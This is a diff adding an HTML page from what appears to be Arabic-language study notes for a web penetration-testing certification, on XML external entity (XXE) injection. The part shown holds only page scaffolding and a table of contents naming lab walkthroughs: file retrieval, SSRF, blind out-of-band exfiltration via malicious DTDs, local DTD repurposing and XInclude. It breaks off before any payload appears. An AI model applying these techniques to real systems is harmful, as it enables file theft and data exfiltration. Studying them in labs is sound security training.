@@ -1,0 +1,4123 @@
+
+<!doctype html>
+<html lang="ar" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../OS%20Command%20Injection/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>XML injection (XXE) - eWAPTX Zero-Day Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/hacker_style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="rtl" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-xxe-what-is-xxe" class="md-skip">
+          انتقل إلى المحتوى
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="عنوان العارضة">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-header__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            eWAPTX Zero-Day Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XML injection (XXE)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="بحث" placeholder="بحث" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="إبحث">
+        
+        <button type="reset" class="md-search__icon md-icon" title="مسح كلي" aria-label="مسح كلي" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            بدء البحث
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="تصفح" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="eWAPTX Zero-Day Notes" class="md-nav__button md-logo" aria-label="eWAPTX Zero-Day Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    eWAPTX Zero-Day Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-EWAPTX/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1 EWAPTX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-EWAPTX%20%28part%202%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2 EWAPTX (part 2)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-Enumeration%20%26%20Brute%20force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication Enumeration — الفكرة ببساطة
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-JWT%20port_swigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ليه JWT vulnerabilities خطيرة جداً ؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-Oauth%20portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5 Oauth portswigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-SQL%20INJECTION/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6 SQL INJECTION
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-Blind%20Sql%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20Command%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XML injection (XXE)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XML injection (XXE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-xxe-what-is-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. يعني إيه XXE أصلاً؟ (What is XXE?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-how-do-xxe-vulnerabilities-arise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. إزاي الثغرة دي بتحصل؟ (How do XXE vulnerabilities arise?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-what-is-xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طيب في الاول إيه هو الـ XML أصلاً؟ (What is XML?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-xml-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إيه هي الـ XML Entities؟ (الكيانات)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-dtd-document-type-definition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. إيه هو الـ DTD (Document Type Definition)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-custom-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. إيه هي الـ Custom Entities؟ (الكيانات المخصصة)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-external-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. الطامة الكبرى: الـ External Entities 🚨
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. إيه هي أنواع هجمات الـ XXE؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بننفذ هجوم استخراج الملفات؟ (Exploiting XXE to retrieve files)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="إزاي بننفذ هجوم استخراج الملفات؟ (Exploiting XXE to retrieve files)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 تعال نشوف المثال العملي (السيناريو):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الهجوم (The Payload):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 ملاحظة مهمة جداً للشغل في الواقع (Pro Tip):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-using-external-entities-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE using external entities to retrieve files :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intercepting-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة الأولى: اصطياد الطلب (Intercepting the Request)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defining-the-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة التانية: زرع القنبلة (Defining the External Entity)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#triggering-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة الثالثة: تفجير الثغرة (Triggering the Exploit)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        النتيجة (إيه اللي بيحصل في الكواليس؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        يعني إيه SSRF من خلال الـ XXE؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-payload_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بننفذ الهجوم؟ (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        سيناريوهات الهجوم (النتائج)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="سيناريوهات الهجوم (النتائج)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-ssrf-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE to perform SSRF attacks :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات حل اللاب بالتفصيل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="خطوات حل اللاب بالتفصيل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        دلوقتي ندخل علي ال Blind XXE :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xxe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طرق استغلال الـ Blind XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بنكتشف الثغرة أصلاً بطريقة OAST؟
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="إزاي بنكتشف الثغرة أصلاً بطريقة OAST؟">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📥 الخطوة 1: اصطياد الطلب (Intercept the Request)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-define-the-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الخطوة 2: زرع رابط الكولابوريتور (Define the External Entity)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-trigger-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة 3: تفعيل الهجوم (Trigger the Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-poll-for-interactions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        👁️ الخطوة 4: التحقق وصيد الاتصال (Poll for Interactions)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#behind-the-scenes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 فكرة العمل (Behind the Scenes) عشان تفهمها لنفسك:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass Techniques :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المشكلة: ليه الهجوم العادي ممكن يفشل؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-parameter-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 الحل السحري: الـ XML Parameter Entities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 كيف تنفذ الهجوم؟ (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Blind XXE with out-of-band interaction via XML parameter entities :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE to exfiltrate data out-of-band :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الخطوة الأولى: تجهيز الفخ (الملف الخبيث على سيرفرك)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة الثانية: إطلاق شرارة الهجوم (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-catch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ ملاحظة هامة جداً للمحترفين (The Catch):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting blind XXE to exfiltrate data using a malicious external DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#collaborator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الأولى: تجهيز سيرفر الاستقبال (Collaborator)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثانية: تجهيز الفخ (Exploit Server)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerable-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثالثة: إطلاق الهجوم (The Vulnerable App)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الرابعة: حصد الغنائم
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE to retrieve data via error messages :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الفخ (ملف الـ DTD الخبيث)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-crash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 لحظة الانفجار (The Crash)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخلاصة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting blind XXE to retrieve data via error messages :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-exploit-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪤 الخطوة 1: تجهيز الفخ على الـ Exploit Server
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-the-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة 2: توجيه ضربة الهجوم (The Attack)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-response" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 الخطوة 3: حصد الغنائم مباشرة في الـ Response
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-by-repurposing-a-local-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE by repurposing a local DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#firewall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛑 الكابوس (الـ Firewall قفل كل حاجة)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-xml-loophole" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 الثغرة القانونية (The XML Loophole)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#repurposing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪤 إزاي بننفذ الخدعة دي؟ (Repurposing)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dtd-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 إزاي نلاقي ملف الـ DTD المحلي أصلاً؟ (Reconnaissance)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE to retrieve data by repurposing a local DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخطوة 1: اصطياد الطلب (Intercept)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الخطوة 2: زرع الـ Payload المُهجن
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 الخطوة 3: التنفيذ وحصد البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ==اجابة السؤال الاول :==
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-recon-information-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ الاستكشاف الأولي (Recon &amp; Information Disclosure)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-fuzzing-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ استخدام الـ Fuzzing لاكتشاف ملفات الـ DTD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-intruder-the-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ كيف تقرأ نتائج الـ Intruder؟ (The Oracle)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ==اجابة السؤال الثاني :==
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-first-come-first-served" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 قاعدة "الأسبقية" في الـ XML (First Come, First Served)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#isoamso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 إزاي الباحثين عرفوا إن فيه متغير اسمه ISOamso؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخلاصة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-hidden-attack-surface-for-xxe-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding hidden attack surface for XXE injection :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المشكلة: اختفاء الـ XML من الطلب
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه الـ XXE العادي بيفشل هنا؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xinclude" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الحل البديل: هجوم الـ XInclude
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 تحليل الـ Payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخلاصة
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xinclude-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XInclude to retrieve files :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance-source-code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 المرحلة الأولى: الاستكشاف المتقدم (Reconnaissance &amp; Source Code Review)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 المرحلة الثانية: خطوات الحل العملية
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 المرحلة الثانية: خطوات الحل العملية">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
